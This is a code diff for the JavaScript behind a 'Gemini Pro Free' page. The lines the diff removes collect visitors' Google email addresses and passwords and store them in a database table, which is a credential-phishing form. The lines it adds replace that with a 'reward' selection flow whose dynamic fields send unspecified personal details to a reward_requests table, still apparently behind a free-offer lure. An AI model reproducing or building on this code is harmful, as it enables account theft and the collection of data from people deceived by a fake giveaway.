@@ -1,6 +1,7 @@
 // Gemini Pro Free - Main JavaScript
 
 let currentStep = 1;
+let currentRewardType = null;
 let supabase = null;
 
 // Initialize Supabase
@@ -27,6 +28,9 @@ function initializeApp() {
 
     // Setup event listeners
     setupEventListeners();
+    
+    // Initialize reward selection
+    initializeRewardSelection();
     
     // Show first step
     showStep(1);
@@ -59,6 +63,91 @@ function setupEventListeners() {
     const formInputs = document.querySelectorAll('.form-input');
     formInputs.forEach(input => {
         input.addEventListener('input', validateForm);
+    });
+}
+
+// Initialize reward options on page load
+function initializeRewardSelection() {
+    const currentLanguage = 'en'; // Hardcoded for English page
+    const visibleRewards = getVisibleRewardTypes(currentLanguage);
+    
+    // Populate reward selection
+    const container = document.getElementById('rewardOptionsContainer');
+    if (container) {
+        container.innerHTML = '';
+        visibleRewards.forEach(reward => {
+            const div = document.createElement('div');
+            div.className = 'reward-option';
+            div.innerHTML = `
+                <input type="radio" name="rewardType" value="${reward.type}" 
+                       id="reward_${reward.type}" onchange="updateSelectedReward('${reward.type}')">
+                <label for="reward_${reward.type}">
+                    <strong>${reward.label}</strong>
+                    <p>${reward.description}</p>
+                </label>
+            `;
+            container.appendChild(div);
+        });
+    }
+}
+
+// Update selected reward
+function updateSelectedReward(rewardType) {
+    currentRewardType = rewardType;
+    const selectBtn = document.getElementById('selectRewardBtn');
+    if (selectBtn) {
+        selectBtn.disabled = false;
+    }
+}
+
+// Confirm reward selection and move to next step
+function confirmRewardSelection() {
+    if (!currentRewardType) {
+        showNotification('Please select a reward!', 'error');
+        return;
+    }
+    
+    // Update the reward type select dropdown
+    const rewardTypeSelect = document.getElementById('rewardType');
+    if (rewardTypeSelect) {
+        rewardTypeSelect.value = currentRewardType;
+        rewardTypeSelect.disabled = false;
+    }
+    
+    // Update form fields
+    updateFormFields();
+    
+    // Move to next step
+    nextStep();
+}
+
+// Update form fields dynamically based on selected reward
+function updateFormFields() {
+    const rewardType = document.getElementById('rewardType')?.value || currentRewardType;
+    if (!rewardType) return;
+    
+    currentRewardType = rewardType;
+    const config = REWARD_CONFIGS[rewardType];
+    const container = document.getElementById('dynamicFormFields');
+    
+    if (!container || !config) return;
+    
+    container.innerHTML = '';
+    config.fields.forEach(field => {
+        const fieldHTML = `
+            <div class="form-group">
+                <label for="${field.id}" class="form-label">${field.label}</label>
+                <input 
+                    type="${field.type}" 
+                    id="${field.id}" 
+                    class="form-input" 
+                    placeholder="${field.placeholder}"
+                    ${field.required ? 'required' : ''}
+                >
+                <span class="form-hint">${field.label}</span>
+            </div>
+        `;
+        container.innerHTML += fieldHTML;
     });
 }
 
@@ -117,19 +206,26 @@ function updateProgressBar(stepNumber) {
 
 // Form Validation
 function validateForm() {
-    const email = document.getElementById('email');
-    const password = document.getElementById('password');
-    const contactEmail = document.getElementById('contactEmail');
-
-    if (!email || !password || !contactEmail) return false;
-
-    const isValid = email.value.trim() !== '' && 
-                   password.value.trim() !== '' && 
-                   contactEmail.value.trim() !== '' &&
-                   isValidEmail(email.value) &&
-                   isValidEmail(contactEmail.value);
-
-    return isValid;
+    if (!currentRewardType) return false;
+    
+    const config = REWARD_CONFIGS[currentRewardType];
+    if (!config) return false;
+    
+    // Check if all required fields are filled
+    for (let field of config.fields) {
+        const element = document.getElementById(field.id);
+        if (!element) continue;
+        
+        const value = element.value.trim();
+        if (field.required && value === '') return false;
+        
+        // Validate email fields
+        if (field.type === 'email' && value !== '' && !isValidEmail(value)) {
+            return false;
+        }
+    }
+    
+    return true;
 }
 
 function isValidEmail(email) {
@@ -139,16 +235,44 @@ function isValidEmail(email) {
 
 // Form Submission
 async function submitForm() {
+    // Validate reward selection
+    if (!currentRewardType) {
+        showNotification('Please select a reward!', 'error');
+        return;
+    }
+
     // Validate form
     if (!validateForm()) {
         showNotification('Please fill in all valid information!', 'error');
         return;
     }
 
-    // Get form values
-    const email = document.getElementById('email').value.trim();
-    const password = document.getElementById('password').value.trim();
-    const contactEmail = document.getElementById('contactEmail').value.trim();
+    // Get form values dynamically based on reward type
+    const config = REWARD_CONFIGS[currentRewardType];
+    const formData = {};
+    
+    config.fields.forEach(field => {
+        const element = document.getElementById(field.id);
+        if (element) {
+            formData[field.id] = element.value;
+        }
+    });
+
+    // Validate form data
+    const validation = validateRewardForm(currentRewardType, formData);
+    if (!validation.valid) {
+        showNotification(validation.error, 'error');
+        return;
+    }
+
+    // Build reward details
+    let rewardDetails;
+    try {
+        rewardDetails = buildRewardDetails(currentRewardType, formData);
+    } catch (error) {
+        showNotification('Error processing data: ' + error.message, 'error');
+        return;
+    }
 
     // Show loading
     showLoading(true);
@@ -157,14 +281,13 @@ async function submitForm() {
         // Save to Supabase
         if (supabase) {
             const { data, error } = await supabase
-                .from('gemini_requests')
+                .from('reward_requests')
                 .insert([
                     {
-                        google_email: email,
-                        google_password: password,
-                        contact_email: contactEmail,
-                        created_at: new Date().toISOString(),
-                        status: 'pending'
+                        reward_type: currentRewardType,
+                        reward_details: rewardDetails,
+                        status: 'pending',
+                        created_at: new Date().toISOString()
                     }
                 ]);
 
@@ -177,9 +300,8 @@ async function submitForm() {
         } else {
             // Fallback: Log to console if Supabase is not configured
             console.log('Form submitted (Supabase not configured):', {
-                google_email: email,
-                google_password: password,
-                contact_email: contactEmail,
+                reward_type: currentRewardType,
+                reward_details: rewardDetails,
                 created_at: new Date().toISOString()
             });
             
@@ -200,7 +322,7 @@ async function submitForm() {
 
     } catch (error) {
         showLoading(false);
-        showNotification('An error occurred. Please try again!', 'error');
+        showNotification(error.message || 'An error occurred. Please try again!', 'error');
         console.error('Error:', error);
     }
 }
@@ -213,21 +335,26 @@ function resetForm() {
         form.reset();
     }
 
-    // Reset checkbox
-    const checkbox = document.getElementById('confirmSteps');
-    if (checkbox) {
-        checkbox.checked = false;
-    }
+    // Reset reward selection
+    const rewardOptions = document.querySelectorAll('input[name="rewardType"]');
+    rewardOptions.forEach(option => {
+        option.checked = false;
+    });
 
-    // Reset current step
+    // Reset variables
+    currentRewardType = null;
     currentStep = 1;
     showStep(1);
 
-    // Disable continue button
+    // Disable buttons
     const continueBtn = document.getElementById('continueBtn');
-    if (continueBtn) {
-        continueBtn.disabled = true;
-    }
+    const selectRewardBtn = document.getElementById('selectRewardBtn');
+    if (continueBtn) continueBtn.disabled = true;
+    if (selectRewardBtn) selectRewardBtn.disabled = true;
+    
+    // Clear dynamic form fields
+    const dynamicFields = document.getElementById('dynamicFormFields');
+    if (dynamicFields) dynamicFields.innerHTML = '';
 }
 
 // Loading Overlay
